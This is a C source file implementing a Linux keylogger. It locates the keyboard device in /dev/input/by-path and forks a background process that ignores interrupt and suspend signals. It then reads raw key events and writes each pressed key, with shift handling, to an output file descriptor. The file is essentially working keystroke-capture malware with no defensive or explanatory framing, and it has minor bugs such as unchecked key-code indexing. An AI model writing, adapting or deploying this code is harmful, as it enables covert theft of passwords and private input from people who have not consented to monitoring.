#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <fcntl.h>
#include <signal.h>
#include <dirent.h>

#define MAXLINE 8192

static const char keycodes[120][MAXLINE] =
    {
        "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
        "-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i",
        "o", "p", "[", "]", "ENTER", "L_CTRL", "a", "s", "d", "f", "g", "h",
        "j", "k", "l", ";", "'", "`", "L_SHIFT", "\\", "z", "x", "c", "v", "b",
        "n", "m", ",", ".", "/", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK",
        "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK",
        "SCROLL_LOCK", "NL_7", "NL_8", "NL_9", "-", "NL_4", "NL5",
        "NL_6", "+", "NL_1", "NL_2", "NL_3", "INS", "DEL", "UNKNOWN", "UNKNOWN", "UNKNOWN",
        "F11", "F12", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "R_ENTER", "R_CTRL", "/",
        "PRT_SCR", "R_ALT", "UNKNOWN", "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END",
        "DOWN", "PAGE_DOWN", "INSERT", "DELETE", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN",
        "PAUSE"};

static const char shifted_keycodes[120][MAXLINE] =
    {
        "RESERVED", "ESC", "!", "@", "#", "$", "%%", "^", "&", "*", "(", ")",
        "_", "+", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I",
        "O", "P", "{", "}", "ENTER", "L_CTRL", "A", "S", "D", "F", "G", "H",
        "J", "K", "L", ":", "\"", "~", "L_SHIFT", "|", "Z", "X", "C", "V", "B",
        "N", "M", "<", ">", "?", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK",
        "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK",
        "SCROLL_LOCK", "HOME", "UP", "PGUP", "-", "LEFT", "NL_5",
        "R_ARROW", "+", "END", "DOWN", "PGDN", "INS", "DEL", "UNKNOWN", "UNKNOWN", "UNKNOWN",
        "F11", "F12", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "R_ENTER", "R_CTRL", "/",
        "PRT_SCR", "R_ALT", "UNKNOWN", "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END",
        "DOWN", "PAGE_DOWN", "INSERT", "DELETE", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN",
        "PAUSE"};

void get_keyboard_file(char *kbdfile)
{
    DIR *d;
    struct dirent *dir;
    char buffer[8000];
    char dr[] = "/dev/input/by-path/";
    d = opendir(dr);
    if (d)
    {
        while ((dir = readdir(d)) != NULL)
        {
            if (strstr(dir->d_name, "kbd"))
            {
                snprintf(buffer, 8000, "%s%s", dr, dir->d_name);
                printf("\nFound keyboard file:%s\n", buffer);
                strcpy(kbdfile, buffer);
                break;
            }
        }
        closedir(d);
    }
}

void writer(int output_fd, const char *strToWrite)
{
    int written = 0;
    int toWrite = strlen(strToWrite);

    do
    {
        written = write(output_fd, strToWrite, toWrite);

        if (written == -1)
        {
            return;
        }
        toWrite -= written;
        strToWrite += written;
    } while (toWrite > 0);
}

void keylogger(int output_fd)
{
    char KEYBOARD_DEV_FILE[100];
    get_keyboard_file(KEYBOARD_DEV_FILE);
    char buf[MAXLINE];
    if (!fork())
    {
        signal(SIGINT, SIG_IGN);
        signal(SIGTSTP, SIG_IGN);
        int key_dev_fd, shift = 0, bRead;
        struct input_event event[100];
        if ((key_dev_fd = open(KEYBOARD_DEV_FILE, O_RDONLY)) < 0)
        {
            printf("\nUnable access keyboard device file! Might require SU access...\n");
            exit(1);
        }
        while (1)
        {
            bRead = read(key_dev_fd, event, sizeof(struct input_event) * 100);
            for (size_t i = 0; i < (bRead / sizeof(struct input_event)); i++)
            {
                if (event[i].type == EV_KEY && event[i].value == 1)
                {
                    if (event[i].code == KEY_ESC)
                    {
                        close(key_dev_fd);
                        close(output_fd);
                        return;
                    }
                    if ((event[i].code == KEY_LEFTSHIFT) || (event[i].code == KEY_RIGHTSHIFT))
                    {
                        shift = event[i].code;
                    }
                    if (shift && !((event[i].code == KEY_LEFTSHIFT) || (event[i].code == KEY_RIGHTSHIFT)))
                    {
                        strncpy(buf, shifted_keycodes[event[i].code], strlen(shifted_keycodes[event[i].code]) + 1);
                        writer(output_fd, buf);
                        writer(output_fd, "\n");
                    }
                    if (!shift && !((event[i].code == KEY_LEFTSHIFT) || (event[i].code == KEY_RIGHTSHIFT)))
                    {
                        strncpy(buf, keycodes[event[i].code], strlen(keycodes[event[i].code]) + 1);
                        writer(output_fd, buf);
                        writer(output_fd, "\n");
                    }
                }
                else
                {
                    if (event[i].type == EV_KEY && event[i].value == 0)
                    {
                        if ((event[i].code == KEY_LEFTSHIFT) || (event[i].code == KEY_RIGHTSHIFT))
                        {
                            shift = 0;
                        }
                    }
                }
            }
        }
    }
}